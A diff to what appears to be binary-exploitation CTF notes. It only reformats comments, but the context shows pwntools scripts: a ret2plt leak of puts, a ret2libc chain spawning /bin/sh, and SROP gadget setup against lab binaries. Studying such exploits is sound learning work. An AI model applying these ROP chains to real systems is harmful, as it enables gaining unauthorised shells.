@@ -405,7 +405,9 @@ addr_main = elf.symbols["main"] # 0x400626 (1st Address Prologue Main Function)
 
 p.recvuntil("ROP me outside, how \'about dah?\n") # wait str to send pld
 
-# ret2plt + ret2main
+#########################################################################################
+#				   ret2plt + ret2main					#
+#########################################################################################
 pld = b""
 pld += padding # buffer + overwrite RBP (8 octets)
 pld += p64(gadget) # 1 argument (pop rdi ; ret)
@@ -414,7 +416,9 @@ pld += p64(puts_plt) # to print puts GOT
 pld += p64(addr_main) # ret2main
 p.sendline(pld) # send payload
 
-# Parse Addr
+#########################################################################################
+#				   Addr Parsing					        #
+#########################################################################################
 puts_leak = u64(p.recvline().strip().ljust(8, b"\x00"))
 log.info("Leaked libc address puts : {}".format(hex(puts_leak)))
 
@@ -426,7 +430,9 @@ log.info("Libc base : " + hex(libc_base))
 log.info("System address : " + hex(addr_system))
 log.info("/bin/sh : " + hex(binsh))
 
-# ret2libc
+#########################################################################################
+#				   ret2libc						#
+#########################################################################################
 pld = b""
 pld += padding # offset to go save RIP 
 pld += p64(gadget) # gadget to pass a parameter to called function (pop rdi ; ret)
@@ -490,8 +496,8 @@ elf = ELF("./srop")
 context.arch = "amd64"
 
 padding = "A" * 72 # offset to overwrite RIP
-pop_rax = 0x401020
-id_sys_rt_sigretun = 15
+pop_rax = 0x401020 # gadget to setup 15 in RAX
+id_sys_rt_sigretun = 15 # https://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/
 syscall = 0x40101b
 bin_sh = 0x402000
 
